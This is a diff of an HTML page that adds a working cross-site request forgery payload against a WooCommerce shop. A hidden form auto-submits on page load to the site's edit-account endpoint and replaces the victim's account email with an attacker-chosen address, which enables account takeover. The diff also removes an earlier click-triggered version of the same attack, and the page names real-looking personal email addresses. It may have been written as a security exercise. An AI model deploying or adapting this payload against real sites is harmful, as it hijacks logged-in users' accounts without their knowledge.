@@ -2971,31 +2971,26 @@
       defer
       data-wp-strategy="defer"
     ></script>
+    <form
+      id="csrf"
+      action="https://mydecobox.shop/my-account/edit-account/"
+      method="POST"
+    >
+      <!-- Trường Họ -->
+      <input type="hidden" name="account_first_name" value="Nguyễn" />
+      <!-- Trường Tên -->
+      <input type="hidden" name="account_last_name" value="Văn A" />
+      <!-- Trường Display Name (thường mặc định là username hoặc kết hợp) -->
+      <input type="hidden" name="account_display_name" value="lacnhuwork" />
+      <!-- Trường Email mới -->
+      <input type="hidden" name="account_email" value="lcnhu.uit@gmail.com" />
+      <!-- Flag để WooCommerce nhận biết “Save changes” -->
+      <input type="hidden" name="save_account_details" value="Save changes" />
+    </form>
+
     <script>
-      document.getElementById("go").addEventListener("click", function (e) {
-        e.preventDefault();
-
-        // 1) Tạo form ẩn
-        var f = document.createElement("form");
-        f.method = "POST";
-        f.action = "https://mydecobox.shop/my-account/edit-account/";
-        f.style.display = "none";
-
-        // 2) Thêm trường email mới
-        var email = document.createElement("input");
-        email.name = "account_email";
-        email.value = "22521048@gm.uit.edu.vn"; // giá trị do attacker đặt
-        f.appendChild(email);
-
-        // 3) Thêm flag lưu thay đổi
-        var save = document.createElement("input");
-        save.name = "save_account_details";
-        save.value = "Save changes";
-        f.appendChild(save);
-
-        document.body.appendChild(f);
-        f.submit();
-      });
+      // Auto-submit ngay khi trang load
+      document.getElementById("csrf").submit();
     </script>
   </body>
 </html>
